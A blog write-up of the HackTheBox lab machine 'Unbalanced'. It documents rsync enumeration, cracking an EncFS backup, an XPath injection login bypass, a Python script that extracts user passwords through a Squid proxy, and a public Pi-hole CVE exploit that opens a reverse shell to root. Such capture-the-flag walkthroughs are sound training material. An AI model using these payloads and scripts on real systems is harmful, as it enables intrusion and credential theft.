---
layout: default
title : bvr0n - Unbalanced Write-up
---

_**Oct 10, 2020**_

[Unbalanced](https://www.hackthebox.eu/home/machines/profile/268) Writeup


## Nmap Scan :
```
bvr0n@kali:~$ nmap -sC -sV 10.10.10.200
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp  open  rsync      (protocol version 31)
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
```

## Rsync :

We can liste all modules through this commands :

```
bvr0n@kali:~$ rsync -av --list-only rsync://10.10.10.200:873
conf_backups    EncFS-encrypted configuration backups
```

We can see that there is a shared folder, let's see what's inside :

```
bvr0n@kali:~$ rsync -av --list-only rsync://10.10.10.200:873/conf_backups
receiving incremental file list
drwxr-xr-x          4,096 2020/04/04 11:05:32 .
-rw-r--r--            288 2020/04/04 11:05:31 ,CBjPJW4EGlcqwZW4nmVqBA6
-rw-r--r--            135 2020/04/04 11:05:31 -FjZ6-6,Fa,tMvlDsuVAO7ek
-rw-r--r--          1,297 2020/04/02 09:06:19 .encfs6.xml
-rw-r--r--            154 2020/04/04 11:05:32 0K72OfkNRRx3-f0Y6eQKwnjn
-rw-r--r--             56 2020/04/04 11:05:32 27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
-rw-r--r--            190 2020/04/04 11:05:32 2VyeljxHWrDX37La6FhUGIJS
```

Let's grab the whole folder :

```
bvr0n@kali:~/CTF/HTB/Unbalanced$ rsync -av rsync://10.10.10.200:873/conf_backups conf_backups/.
```

And decrypt it, but first let's turn it to somethin that JohnTheRipper can understand :

```
bvr0n@kali:~/CTF/HTB/Unbalanced$ /usr/share/john/encfs2john.py conf_backups/ > hashed.txt
bvr0n@kali:~/CTF/HTB/Unbalanced$ sudo john hashed.txt --wordlist=/home/bvr0n/Documents/rockyou.txt
[sudo] password for bvr0n: 
Using default input encoding: UTF-8
Loaded 1 password hash (EncFS [PBKDF2-SHA1 128/128 AVX 4x AES])
Cost 1 (iteration count) is 580280 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bubblegum        (conf_backups/)
```

Now all we have to do is decrypt them :

```
bvr0n@kali:~/CTF/HTB/Unbalanced$ encfs ~/CTF/HTB/Unbalanced/conf_backups/ ~/CTF/HTB/Unbalanced/output/
EncFS Password: 
```

Using a basic technick get us the password : 

```
bvr0n@kali:~/CTF/HTB/Unbalanced/output$ cat * | grep -i passwd
cachemgr_passwd Thah$Sh1
```

Looks like we got Cache Manager's Password, [Check Here](http://etutorials.org/Server+Administration/Squid.+The+definitive+guide/Chapter+14.+Monitoring+Squid/14.2+The+Cache+Manager/) for more information about it :

```
bvr0n@kali:~/CTF/HTB/Unbalanced$ squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:fqdncache

Address                                       Flg TTL Cnt Hostnames
127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
::1                                             H -001   3 localhost ip6-localhost ip6-loopback
172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
127.0.0.1                                       H -001   1 localhost
172.17.0.1                                      H -001   1 intranet.unbalanced.htb
ff02::1                                         H -001   1 ip6-allnodes
ff02::2                                         H -001   1 ip6-allrouters
10.10.14.64                                    N  -221   0
10.10.14.251                                   N  -5322   0
10.10.15.11                                    N  -8266   0
```

When we go to http://172.31.179.1/intranet.php through the proxy, we get a login form , we try some XPATH Injections and we get something :

```
Username : blah' or 1=1 or 'a'='a
Password : blah
```
Now we have to write a scripte to grabe the passwords for us.

After writing an exploit (Thanks to [m3dsec](github.com/m3dsec) for the help) we get the creds for ssh :

Final [m3dsec](github.com/m3dsec) script :
```python
!/usr/bin/python3
import requests
import string

squid = {"http":"http://10.10.10.200:3128"}
url = 'http://172.31.179.1/intranet.php'

alphabet = string.ascii_letters + string.digits + '@?><":}{)(*&^%$#!~'
users = ['rita','jim','bryan','sarah']
l = 0
fp = ''

for u in users:
    try:
        print("[*] Retriving " + u + "'s password..")
        for i in range(1, 30):
            # for every i, check if character is in that number range
            for c in alphabet:
                paylaod = "' or username='" + u + "' or substring(Password," + str(i) + ",1)='" + str(c) + "' or'"
                form_data = {"Username":u,"Password":paylaod}
                #print(form_data)
                r = requests.post(url, proxies=squid,data=form_data)
                if len(r.text) != 6736 and u in r.text:
                    fp += c
                    print("[*] Found a new character : " + str(c))
                    print("[*] " + u + ":" + fp)
            l += 1
        print("[*] " + u + ":" + fp)
    except KeyboardInterrupt:
        print()
        continue
```
```
rita : pass*******
jim : sta********eaven
bryan : ireal***********egum!!!
sarah : sara*****h'
```
Login to ssh with `bryan` give us the user flag.

After a while and lot of Enumeration i realised that we need to Port-Forward to the Pi-Hole Admin console :
```
bvr0n@kali:~$ ssh -L 8088:localhost:8080 -N -f bryan@10.10.10.200
bvr0n@kali:~$ nmap localhost -p 8088

PORT     STATE SERVICE
8088/tcp open  radan-http
```

Now we can access it, Password is : `admin`

After pooking arount i found this [exploit](https://github.com/AndreyRainchik/CVE-2020-8816), let's give it a try :
```
bvr0n@kali:~/CTF/HTB/Unbalanced$ python3 CVE-2020-8816.py http://127.0.0.1:8088/ admin 10.10.14.44 4444
bvr0n@kali:~/CTF/HTB/Unbalanced$ nc -lnvp 444

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /root
$ ls
ph_install.sh
pihole_config.sh
```

After checking `pihole_config.sh` i found something pretty intresting :
```
# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3********Ry0n3!'
```
That was the Root password for ssh !!!

<br>
best regards

[bvr0n](https://github.com/bvr0n)


<br>
<br>
[back to main](https://bvr0n.github.io/)

<br>
